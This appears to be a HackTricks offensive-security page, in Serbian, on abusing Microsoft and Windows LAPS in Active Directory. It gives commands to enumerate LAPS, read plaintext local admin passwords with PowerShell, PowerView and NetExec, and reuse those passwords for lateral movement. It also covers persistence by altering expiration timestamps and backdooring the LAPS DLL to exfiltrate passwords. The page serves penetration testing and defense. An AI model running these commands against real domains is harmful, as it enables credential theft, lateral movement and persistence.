# LAPS

{{#include ../../banners/hacktricks-training.md}}


## Osnovne informacije

Trenutno postoje **2 LAPS varijante** sa kojima se možete susresti tokom procene:

- **Legacy Microsoft LAPS**: čuva lozinku lokalnog administratora u atributu **`ms-Mcs-AdmPwd`**, a vreme isteka u atributu **`ms-Mcs-AdmPwdExpirationTime`**.
- **Windows LAPS** (ugrađen u Windows od ažuriranja iz aprila 2023. godine): i dalje može da emulira legacy režim, ali u nativnom režimu koristi atribute **`msLAPS-*`**, podržava **šifrovanje lozinke**, **istoriju lozinki** i **backup DSRM lozinke** za kontrolere domena.

LAPS je dizajniran za upravljanje **lozinkama lokalnog administratora**, tako da one budu **jedinstvene, nasumično generisane i često menjane** na računarima pridruženim domenu. Ako možete da čitate te atribute, obično možete da izvršite **pivot kao lokalni administrator** na pogođeni host. U mnogim okruženjima nije zanimljivo samo čitanje same lozinke, već i pronalaženje **kome je delegiran pristup** atributima lozinke.

### Legacy Microsoft LAPS atributi

U objektima računara u domenu, implementacija legacy Microsoft LAPS dodaje dva atributa:<sup>[[1]](#references)</sup>

- **`ms-Mcs-AdmPwd`**: **lozinka administratora u čistom tekstu**
- **`ms-Mcs-AdmPwdExpirationTime`**: **vreme isteka lozinke**

### Windows LAPS atributi

Nativni Windows LAPS dodaje nekoliko novih atributa objektima računara:<sup>[[2]](#references)</sup>

- **`msLAPS-Password`**: blob lozinke u čistom tekstu, sačuvan kao JSON kada šifrovanje nije omogućeno
- **`msLAPS-PasswordExpirationTime`**: planirano vreme isteka
- **`msLAPS-EncryptedPassword`**: trenutna šifrovana lozinka
- **`msLAPS-EncryptedPasswordHistory`**: istorija šifrovanih lozinki
- **`msLAPS-EncryptedDSRMPassword`** / **`msLAPS-EncryptedDSRMPasswordHistory`**: šifrovani podaci DSRM lozinke za kontrolere domena
- **`msLAPS-CurrentPasswordVersion`**: praćenje verzije zasnovano na GUID-u, koje koristi novija logika za detekciju rollback-a (šema forest-a za Windows Server 2025)

Kada je **`msLAPS-Password`** moguće čitati, vrednost je JSON objekat koji sadrži naziv naloga, vreme ažuriranja i lozinku u čistom tekstu, na primer:<sup>[[2]](#references)</sup>
```json
{"n":"Administrator","t":"1d8161b41c41cde","p":"A6a3#7%..."}
```
### Proverite da li je aktivirano
```bash
# Legacy Microsoft LAPS policy
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Native Windows LAPS binaries / PowerShell module
Get-Command *Laps*
dir "$env:windir\System32\LAPS"

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Legacy Microsoft LAPS-enabled computers (any Domain User can usually read the expiration attribute)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" |
? { $_."ms-mcs-admpwdexpirationtime" -ne $null } |
select DnsHostname

# Native Windows LAPS-enabled computers
Get-DomainObject -LDAPFilter '(|(msLAPS-PasswordExpirationTime=*)(msLAPS-EncryptedPassword=*)(msLAPS-Password=*))' |
select DnsHostname
```
## Pristup LAPS lozinkama

Možete **preuzeti raw LAPS policy** iz `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol`, a zatim koristiti **`Parse-PolFile`** iz paketa [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) da biste ovu datoteku konvertovali u format čitljiv ljudima.

### PowerShell cmdlets za legacy Microsoft LAPS

Ako je legacy LAPS modul instaliran, sledeći cmdlets su obično dostupni:
```bash
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read the LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
### Windows LAPS PowerShell cmdlet-i

Native Windows LAPS dolazi sa novim PowerShell modulom i novim cmdlet-ima:
```bash
Get-Command *Laps*

# Discover who has extended rights over the OU
Find-LapsADExtendedRights -Identity Workstations

# Read a password from AD
Get-LapsADPassword -Identity wkstn-2 -AsPlainText

# Include password history if encryption/history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory

# Query DSRM password from a DC object
Get-LapsADPassword -Identity dc01.contoso.local -AsPlainText

# Use alternate credentials for an authorized decryptor
$cred = Get-Credential CONTOSO\LAPSDecryptor
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -DecryptionCredential $cred
```
Nekoliko operativnih detalja je važno:<sup>[[3]](#references)</sup>

- **`Get-LapsADPassword`** automatski podržava **legacy LAPS**, **clear-text Windows LAPS** i **encrypted Windows LAPS**.
- Ako je lozinka encrypted i možete da je **read**, ali ne i da je **decrypt**, cmdlet vraća metapodatke kao što su **`Source`**, **`DecryptionStatus`** i **`AuthorizedDecryptor`**, čak i kada ne može da vrati lozinku u clear-text obliku.
- Kod **encrypted Windows LAPS**, dozvola za **read** i dozvola za **decrypt** predstavljaju **različite kontrole**. To što imate read pristup OU-u / objektu ne znači automatski da možete da decryptujete **`msLAPS-EncryptedPassword`**.
- **Password history** je dostupna samo kada je omogućeno **Windows LAPS encryption**.
- Na domain controllerima, vraćeni source može biti **`EncryptedDSRMPassword`**.

Ovo je korisno tokom procene jer polje **`AuthorizedDecryptor`** pokazuje **za kog usera ili grupu je blob encrypted**, često pretvarajući neuspešno čitanje lozinke u novu metu za eskalaciju privilegija.

### PowerView / LDAP

**PowerView** se takođe može koristiti da se utvrdi **ko može da read password i da je read**:
```bash
# Legacy Microsoft LAPS: find principals with rights over the OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Legacy Microsoft LAPS: read the password directly from LDAP
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime

# Native Windows LAPS clear-text mode
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password,msLAPS-PasswordExpirationTime
```
Ako je **`msLAPS-Password`** dostupan za čitanje, parsirajte vraćeni JSON i izdvojite **`p`** za lozinku i **`n`** za ime upravljanog lokalnog administratorskog naloga.
```bash
# Extract both the password and the real managed account name
$laps = (Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password)."msLAPS-Password" | ConvertFrom-Json
$laps.n
$laps.p
```
To **`n`** polje je važno u novijim implementacijama zato što **Windows LAPS automatic account management** može da cilja **custom account** umesto ugrađenog naloga **`Administrator`**, a noviji sistemi **Windows 11 24H2 / Windows Server 2025** mogu čak i da **randomize** naziv tog naloga.<sup>[[4]](#references)</sup>

### Linux / alati za udaljeni pristup

Savremeni alati podržavaju i nasleđeni Microsoft LAPS i Windows LAPS.
```bash
# NetExec / CrackMapExec lineage: dump LAPS values over LDAP
nxc ldap 10.10.10.10 -u user -p password -M laps

# Filter to a subset of computers
nxc ldap 10.10.10.10 -u user -p password -M laps -o COMPUTER='WKSTN-*'

# Use read LAPS access to authenticate to hosts at scale
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps

# If the local admin name is not Administrator
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps customadmin

# Legacy Microsoft LAPS with bloodyAD
bloodyAD --host 10.10.10.10 -d contoso.local -u user -p 'Passw0rd!' \
get search --filter '(ms-mcs-admpwdexpirationtime=*)' \
--attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```
Napomene:

- Novije verzije **NetExec** podržavaju **`ms-Mcs-AdmPwd`**, **`msLAPS-Password`** i **`msLAPS-EncryptedPassword`**.
- **`pyLAPS`** je i dalje koristan za **legacy Microsoft LAPS** iz Linuxa, ali cilja samo **`ms-Mcs-AdmPwd`**.
- Noviji cross-platform alati, kao što su **`LAPS4LINUX`**, alati zasnovani na **`dpapi-ng`** i noviji **NetExec** workflows, takođe mogu da rade sa **native Windows LAPS** sa non-Windows hostova.
- Ako okruženje koristi **encrypted Windows LAPS**, jednostavno LDAP čitanje nije dovoljno; takođe morate biti **authorized decryptor** (ili imati ekvivalentni materijal za dešifrovanje, kao što je offline domain DPAPI-NG root key material).<sup>[[5]](#references)</sup>
- Na sistemima **Windows 11 24H2 / Windows Server 2025** nemojte pretpostaviti da je managed local admin uvek **`Administrator`**. Automatic account management može da kreira prilagođeni nalog i opciono randomizuje njegovo ime, zato prvo pronađite ime naloga pomoću **`n`** / **`Account`**, pre nego što u velikom obimu koristite **`--laps`**.<sup>[[4]](#references)</sup>

### Zloupotreba directory synchronization-a

Ako umesto direktnog read access-a na svakom computer object-u imate domain-level prava za **directory synchronization**, LAPS i dalje može biti zanimljiv.

Kombinacija prava **`DS-Replication-Get-Changes`** sa **`DS-Replication-Get-Changes-In-Filtered-Set`** ili **`DS-Replication-Get-Changes-All`** može se koristiti za sinhronizaciju **confidential / RODC-filtered** atributa, kao što je legacy **`ms-Mcs-AdmPwd`**. BloodHound ovo modeluje kao **`SyncLAPSPassword`**. Pogledajte [DCSync](dcsync.md) za pozadinu vezanu za replication rights.

## LAPSToolkit

[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) olakšava enumeration LAPS-a pomoću nekoliko funkcija.<sup>[[6]](#references)</sup>\
Jedna od njih je parsiranje **`ExtendedRights`** za **sve računare na kojima je LAPS omogućen.** Ovo prikazuje **grupe** kojima je konkretno **delegirano pravo da čitaju LAPS passwords**, a to su često korisnici u protected grupama.\
**Nalog** koji je **pridružio računar** domen-u dobija `All Extended Rights` nad tim hostom, a ovo pravo tom **nalogu** omogućava da **čita passwords**. Enumeration može prikazati user account koji može da čita LAPS password na hostu. Ovo može pomoći da **targetiramo određene AD korisnike** koji mogu da čitaju LAPS passwords.
```bash
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expiration time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## Izvlačenje LAPS lozinki pomoću NetExec / CrackMapExec

Ako nemate interaktivni PowerShell, ovu privilegiju možete zloupotrebiti udaljeno preko LDAP-a:
```bash
# Legacy syntax still widely seen in writeups
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps

# Current project name / syntax
nxc ldap 10.10.10.10 -u user -p password -M laps
```
Ovo izlistava sve LAPS secrets koje korisnik može da čita, omogućavajući vam da se krećete lateralno koristeći drugu lozinku lokalnog administratora.

## Korišćenje LAPS lozinke
```bash
xfreerdp /v:192.168.1.1:3389 /u:Administrator
Password: 2Z@Ae)7!{9#Cq

python psexec.py Administrator@web.example.com
Password: 2Z@Ae)7!{9#Cq
```
## LAPS Persistence

### Datum isteka

Kada postanete admin, moguće je **preuzeti lozinke** i **sprečiti** mašinu da **ažurira** svoju **lozinku** tako što ćete **datum isteka postaviti u budućnost**.

Legacy Microsoft LAPS:
```bash
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## SYSTEM on the computer is needed
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
Izvorni Windows LAPS umesto toga koristi **`msLAPS-PasswordExpirationTime`**:
```bash
# Read the current expiration timestamp
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-PasswordExpirationTime

# Push the expiration into the future
Set-DomainObject -Identity wkstn-2 -Set @{"msLAPS-PasswordExpirationTime"="133801632000000000"}
```
> [!WARNING]
> Lozinka će se i dalje rotirati ako **admin** koristi **`Reset-AdmPwdPassword`** / **`Reset-LapsPassword`**, ili ako je omogućena opcija **Do not allow password expiration time longer than required by policy**.

### Napomena o vraćanju snapshot-a na novijem Windows LAPS-u

Stariji trikovi za vraćanje snapshot-a / image-a su **manje pouzdani** protiv novijih **Windows LAPS** deployment-a. Na **Windows 11 24H2 / Windows Server 2025**, ako forest schema uključuje **`msLAPS-CurrentPasswordVersion`** (**Windows Server 2025 forest schema**), client upoređuje lokalno keširani GUID sa vrednošću sačuvanom u AD-u i **odmah rotira lozinku** kada rollback dovede do **torn state** stanja.

U praksi, to znači da persistence zasnovan na snapshot-u ili pokušaji oživljavanja ranije poznate lozinke lokalnog administratora mogu brzo propasti, umesto da opstanu do sledećeg uobičajenog isteka.<sup>[[2]](#references)</sup>

Ova zaštita se primenjuje samo na **AD-backed Windows LAPS** i i dalje zavisi od toga da li vraćena mašina može da se **autentifikuje nazad na AD**. Ako mašina više ne može da komunicira sa AD-om, **password history** ili **AD backup access** i dalje mogu spasiti situaciju.

### Napomena o tamper-u automatskog upravljanja nalozima

Kada je omogućeno **automatic account management**, Windows LAPS upravlja životnim ciklusom upravljanog lokalnog admin naloga. Neočekivani pokušaji preimenovanja, rekonfigurisanja ili drugog tamper-a nad tim nalogom mogu biti odbijeni uz **`STATUS_POLICY_CONTROLLED_ACCOUNT`** / **`ERROR_POLICY_CONTROLLED_ACCOUNT`**, pa je persistence koje zavisi od neprimetnog menjanja LAPS naloga manje pouzdan na novijim endpoint-ima.<sup>[[4]](#references)</sup>

### Oporavak istorijskih lozinki iz AD backup-a

Kada je omogućeno **Windows LAPS encryption + password history**, montirani AD backup-i mogu postati dodatni izvor secrets-a. Ako možete da pristupite montiranom AD snapshot-u i koristite **recovery mode**, možete upitati starije sačuvane lozinke bez komunikacije sa aktivnim DC-om.<sup>[[3]](#references)</sup>
```bash
# Query a mounted AD snapshot on port 50000
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -Port 50000 -RecoveryMode

# Historical entries if history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory -Port 50000 -RecoveryMode
```
Ovo je uglavnom relevantno tokom **krađe AD backup-a**, zloupotrebe **offline forensics** ili pristupa medijima za **disaster recovery**.

### Backdoor

Originalni source code za legacy Microsoft LAPS može se pronaći [ovde](https://github.com/GreyCorbel/admpwd), pa je moguće ubaciti backdoor u code (na primer unutar metode `Get-AdmPwdPassword` u `Main/AdmPwd.PS/Main.cs`) koji će na neki način **exfiltrate-ovati nove password-e ili ih sačuvati negde**.

Zatim kompajlirajte novi `AdmPwd.PS.dll` i upload-ujte ga na mašinu u `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (i promenite vreme izmene).

## Reference

- [1] [Uvod u Microsoft LAPS – Local Administrator Password Solution](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)
- [2] [Windows LAPS schema i proširenja prava za Windows Server Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference)
- [3] [Početak rada sa Windows LAPS i Windows Server Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory)
- [4] [Načini upravljanja nalozima u Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-account-management-modes)
- [5] [LAPS 2.0 Internals - XPN Infosec Blog](https://blog.xpnsec.com/lapsv2-internals/)
- [6] [LAPSToolkit - leoloobeek](https://github.com/leoloobeek/LAPSToolkit)

{{#include ../../banners/hacktricks-training.md}}
